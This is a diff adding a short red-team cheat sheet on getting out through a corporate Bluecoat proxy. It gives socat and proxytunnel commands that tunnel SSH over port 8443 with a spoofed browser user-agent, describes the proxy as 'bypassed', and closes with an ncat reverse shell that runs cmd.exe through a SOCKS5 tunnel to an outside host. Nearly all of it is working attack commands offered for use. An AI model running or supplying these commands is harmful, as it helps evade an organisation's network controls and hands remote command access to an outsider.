@@ -1,0 +1,9 @@
+works with bluecoat:
+socat -v tcp-listen:8000,reuseaddr,fork proxy:PROXYIP:IPADDR:8443,proxyport=8080,proxyauth=user:pass
+proxytunnel -v -p PROXYIP:8080 -d IPADDR:8443 -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)" -N
+proxytunnel -v -p PROXYIP:8080 -d IPADDR:8443 -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)" -P user:pass
+
+SSH to 8443: and corporate proxy bypassed(depends on proxy)
+Or use putty + dynamic ssh tunnel(socks5) -> deliver what you what or use simple ncat reverse shell(if ncat is not blocked)
+ncat.exe -proxy 127.0.0.1:23075 --proxy-type socks5 -n -v IPADDR PORT -e cmd.exe
+^^^Check proxy warpack and ncat for windows^^^
